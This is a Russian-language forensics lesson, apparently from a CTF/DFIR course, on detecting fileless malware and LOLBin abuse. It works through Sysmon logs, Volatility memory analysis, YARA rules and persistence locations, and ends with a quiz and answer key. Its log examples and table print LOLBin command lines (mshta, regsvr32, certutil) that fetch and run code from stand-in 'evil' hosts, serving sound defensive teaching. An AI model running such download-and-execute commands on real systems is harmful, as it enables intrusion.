---
id: forensics-fileless
title: "Fileless-малварь и LOLBins: обнаружение"
category: forensics
parent: forensics-malware-yara
difficulty: hard
order: 1
tags: [fileless, lolbin, powershell, wmi, registry, malware, dfir]
prerequisites: [forensics-malware-yara, forensics-powershell-logs]
useful_for:
  - "CTF Forensics категория"
  - "DFIR / Incident Response"
  - "Threat Hunting / SOC"
estimated_minutes: 45
summary: "Fileless-атаки: LOLBins, PowerShell-пейлоады, WMI/реестр-персистентность, in-memory выполнение — и какие артефакты остаются после них."
---

## Вопрос, с которого всё начинается

Антивирус чист, на диске нет ни одного подозрительного `.exe`. Но сеть показывает
странный трафик, а пользователь жалуется на «тормоза». Где малварь?

Это **fileless-атака**: вредоносный код нигде не сохраняется как файл. Он живёт в
памяти, в реестре, в подписках WMI — или исполняется через **легитимные** системные
утилиты. Файла на диске нет, но следы всё равно остаются. Разберём, где именно.

## Наш пример: подозрительный mshta

Нам выдали `Sysmon.evtx` и `mem.raw` (дамп памяти) с машины после инцидента.
Известно, что пользователь открыл вложение в письме. Начнём с процессов —
Sysmon Event ID **1** (создание процесса):

```bash
$ evtx_dump -o json Sysmon.evtx | jq -r 'select(.Event.System.EventID==1) |
    select(.["Event.EventData.Image"]|test("mshta")) |
    .["Event.EventData.CommandLine"]'
mshta http://evil.tld/payload.hta
```

`mshta.exe` — это легитимная утилита Windows, которая запускает HTA-файлы (HTML
Application, «страницы», которые умеют исполнять код). Атакующий передал ей URL
вместо файла — код загрузится из сети и выполнится в памяти. Такие легитимные
утилиты, используемые во вредоносных целях, называют **LOLBins** (Living Off the
Land Binaries — «живущие на подручных средствах системы»).

## Шаг 1: почему это ловят не сигнатурой

Антивирус проверяет файлы. Здесь файла нет: `mshta.exe` — «родной» для Windows,
подписан Microsoft. Плохим его делает **аргумент** (URL). Значит, детект строят не
на файле, а на **поведении**: какие легитимные утилиты запускаются, с какими
аргументами и кто их породил.

Типичные LOLBins и их злоупотребления:

| LOLBin | Как используют | Что остаётся |
|--------|----------------|--------------|
| `powershell.exe` | `-enc <base64>` | PS 4104, Sysmon 1 |
| `mshta.exe` | `mshta http://evil/x.hta` | Sysmon 1/3/22 |
| `rundll32.exe` | `javascript:` в аргументе | Sysmon 1/7 |
| `regsvr32.exe` | `/i:http://evil/x.sct scrobj.dll` | Sysmon 1/3 |
| `certutil.exe` | `-urlcache -f http://evil/x` | Sysmon 1, файл |

## Шаг 2: кто запустил mshta

Сама по себе утилита может быть безобидной. Решает **родитель** — процесс, который
её породил. Sysmon пишет это в поле `ParentImage`:

```bash
$ evtx_dump -o json Sysmon.evtx | jq -r 'select(.Event.System.EventID==1) |
    select(.["Event.EventData.Image"]|test("mshta")) |
    .["Event.EventData.ParentImage"]'
winword.exe
```

`winword.exe` (Microsoft Word) породил `mshta` — этого быть не должно. Word
запускает утилиты только через **макрос** в документе. Связка «Word → mshta» —
классический признак фишинга с макросом.

## Шаг 3: куда пошёл трафик

Найдём сетевые соединения того же процесса — Sysmon Event ID **3**:

```bash
$ evtx_dump -o json Sysmon.evtx | jq 'select(.Event.System.EventID==3) |
    select(.["Event.EventData.Image"]|test("mshta"))'
```

Адрес назначения совпадёт с `evil.tld`. А DNS-запросы фиксирует Sysmon Event ID
**22**:

```bash
$ evtx_dump -o json Sysmon.evtx | jq -r 'select(.Event.System.EventID==22) |
    .["Event.EventData.QueryName"]' | grep -i evil
evil.tld
```

Так выстраивается цепочка: **Word → mshta → DNS-запрос → соединение с C2**.

## Шаг 4: где живёт код — дамп памяти

Раз кода нет на диске, он в оперативной памяти. Заглянем туда инструментом
**Volatility** — фреймворком для анализа дампов памяти. Плагин `cmdline` выводит
командные строки всех процессов:

```bash
$ vol -f mem.raw windows.cmdline | grep -i mshta
mshta.exe	mshta http://evil.tld/payload.hta
```

А плагин `malfind` ищет **исполняемые регионы памяти**, которые не привязаны к
файлу на диске — это характерный признак инъекции кода:

```bash
$ vol -f mem.raw windows.malfind --pid 6120
PID    Process   Start      End        Protection
6120   mshta.exe 0x...      0x...      PAGE_EXECUTE_READWRITE
```

Регион с правами «читать-писать-исполнять» и без файла-источника — почти всегда
вредоносный. Оттуда можно снять дамп и прогнать YARA (правила поиска по
сигнатурам):

```yara
rule Fileless_PS {
    strings:
        $a = "FromBase64String" ascii wide
        $b = "DownloadString" ascii wide
        $c = "Invoke-Expression" ascii wide
    condition:
        any of them
}
```

## Шаг 5: где малварь закрепилась

Fileless-атака должна как-то пережить перезагрузку — без файла это делается
«бесфайловыми» механизмами закрепления:

- **WMI-подписки** — фильтр + потребитель в базе WMI (см. урок про WMI);
- **реестр** — payload в значении `Run`/`RunOnce`, исполняемый планировщиком;
- **планировщик задач** — задача, запускающая `powershell -enc`.

```bash
$ evtx_dump -o json 'TaskScheduler%4Operational.evtx' | jq -r 'select(.Event.System.EventID==106 or .Event.System.EventID==200) | .Event.EventData' | grep -i powershell
$ rip.pl -r NTUSER.DAT -p run | grep -i powershell
```

## Что нужно включить заранее

Fileless-атаки видны только там, где включён аудит. Что должно быть включено **до**
инцидента:

- **4688** с командной строкой (по умолчанию командная строка не пишется!);
- **Sysmon** — процессы (1), сеть (3), образы (7), `CreateRemoteThread` (8),
  доступ к процессам (10), DNS (22);
- **PowerShell Script Block Logging** (4104);
- **WMI-Activity** (5860/5861).

```bash
$ auditpol /set /subcategory:"Process Creation" /success:enable
```

## Что мы теперь знаем

- **Fileless**-атака не оставляет файла-малвари — код в памяти или в реестре/WMI.
- **LOLBins** — легитимные утилиты (`mshta`, `powershell`, `regsvr32`), используемые во вред.
- Детект строят на **поведении**: аргументы + родительский процесс + сеть.
- **Volatility** (`cmdline`, `malfind`) находит код в памяти.
- Без заранее включённого аудита (4688, Sysmon, 4104) следов может не быть.

## На что смотреть дальше

- **Искать файл-малварь** — у fileless его нет; смотри поведение утилит.
- **Верить, что «легитимный бинарь» безопасен** — LOLBins злоупотребляют именно этим.
- **Игнорировать родителя** — `winword → mshta/powershell` = макрос.
- **Забывать про память** — fileless живёт там; снимай дамп до перезагрузки.
- **Не проверить аудит** — 4688/4104 могут быть выключены.
- **Декодировать base64 как UTF-8** — PowerShell `-enc` это UTF-16LE.

## Квиз

Проверь себя.

```quiz
- question: "Что такое LOLBin?"
  options:
    - "вредоносный файл на диске"
    - "легитимная системная утилита, используемая во вредоносных целях"
    - "тип шифрования"
    - "журнал событий"
  answer: 1
- question: "Какой Sysmon EventID указывает на CreateRemoteThread (инъекцию)?"
  options:
    - "1"
    - "3"
    - "8"
    - "11"
  answer: 2
- question: "Где может храниться fileless-персистентность?"
  options:
    - "только на флешке"
    - "в реестре, WMI-подписках, задачах планировщика"
    - "только в EVTX"
    - "в prefetch"
  answer: 1
- question: "Что показывает PowerShell EventID 4104?"
  options:
    - "сетевые соединения"
    - "тело исполняемого скрипта (после декодирования)"
    - "дамп памяти"
    - "установку службы"
  answer: 1
- question: "Почему при fileless-атаке важно снять дамп памяти?"
  options:
    - "чтобы сохранить in-memory артефакты до перезагрузки"
    - "чтобы расшифровать диск"
    - "чтобы получить EVTX"
    - "чтобы сбросить пароль"
  answer: 0
```

## Куда дальше

Мы разобрали fileless-атаку через LOLBin. В следующем уроке возьмём конкретный
инструмент атакующих — **Cobalt Strike** — и научимся узнавать его «бекон» по
трафику и памяти. А пока запомни: **fileless-атака не оставляет файла, но выдаёт
себя поведением утилит, родителем процесса и памятью**.

## Где пригодится

- **CTF** — задачи на поиск безфайловых атак по логам и памяти.
- **DFIR** — обнаружение и атрибуция LOLBin-активности.
- **Threat Hunting** — охота на подозрительные цепочки процессов.
- **SOC** — правила Sigma на 4104 и Sysmon 1/8/10.
- **Red team awareness** — понимание, какие следы оставляет техника.
